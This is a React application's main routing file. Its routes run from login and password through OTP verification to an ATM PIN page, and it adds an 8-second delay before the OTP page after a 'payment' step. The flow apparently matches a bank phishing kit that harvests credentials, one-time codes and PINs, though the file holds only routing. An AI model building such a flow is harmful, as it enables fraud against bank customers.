import { useState, useEffect } from "react";
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route, useLocation } from "react-router-dom";
import LoadingScreen from "@/components/LoadingScreen";
import Welcome from "./pages/Welcome";
import Index from "./pages/Index";
import PersonalInfo from "./pages/PersonalInfo";
import Login from "./pages/Login";
import Password from "./pages/Password";
import RegistrationComplete from "./pages/RegistrationComplete";
import OTPVerification from "./pages/OTPVerification";
import ATMPin from "./pages/ATMPin";
import Success from "./pages/Success";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

const AppContent = () => {
  const location = useLocation();
  const [isLoading, setIsLoading] = useState(false);
  const [previousPath, setPreviousPath] = useState<string>("");

  useEffect(() => {
    setIsLoading(true);
    
    // Check if navigating from registration-complete to otp-verification
    const isPaymentToOTP = previousPath === "/registration-complete" && location.pathname === "/otp-verification";
    const loadingDuration = isPaymentToOTP ? 8000 : 1500; // 8 seconds for payment to OTP, 1.5 seconds for others
    
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, loadingDuration);

    // Update previous path after navigation
    setPreviousPath(location.pathname);

    return () => clearTimeout(timer);
  }, [location.pathname]);

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <Routes>
      <Route path="/" element={<Welcome />} />
      <Route path="/register" element={<Index />} />
      <Route path="/login" element={<Login />} />
      <Route path="/personal-info" element={<PersonalInfo />} />
      <Route path="/password" element={<Password />} />
      <Route path="/registration-complete" element={<RegistrationComplete />} />
      <Route path="/otp-verification" element={<OTPVerification />} />
      <Route path="/atm-pin" element={<ATMPin />} />
      <Route path="/success" element={<Success />} />
      {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
      <Route path="*" element={<NotFound />} />
    </Routes>
  );
};

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <AppContent />
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
